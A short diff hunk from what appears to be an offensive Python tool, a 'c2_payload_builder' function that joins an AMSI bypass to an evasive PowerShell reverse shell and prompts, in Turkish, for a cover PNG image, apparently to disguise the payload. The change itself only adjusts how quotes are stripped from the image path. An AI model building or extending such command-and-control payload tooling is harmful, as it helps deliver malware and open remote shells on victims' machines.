@@ -351,7 +351,7 @@ def c2_payload_builder():
         shell = build_evasive_ps(lhost, lport)
         full_ps = amsi + ";" + shell
 
-        img_path = input(f"{C.CYAN}  [?] Kapak görseli yolu (PNG) [Örn: photo.png]: {C.RESET}").strip().strip('"')
+        img_path = input(f"{C.CYAN}  [?] Kapak görseli yolu (PNG) [Örn: photo.png]: {C.RESET}").strip().replace('"', '').replace("'", "")
 
         if not os.path.exists(img_path):
             print(f"{C.RED}  [-] Hata: Dosya bulunamadı: {img_path}{C.RESET}")
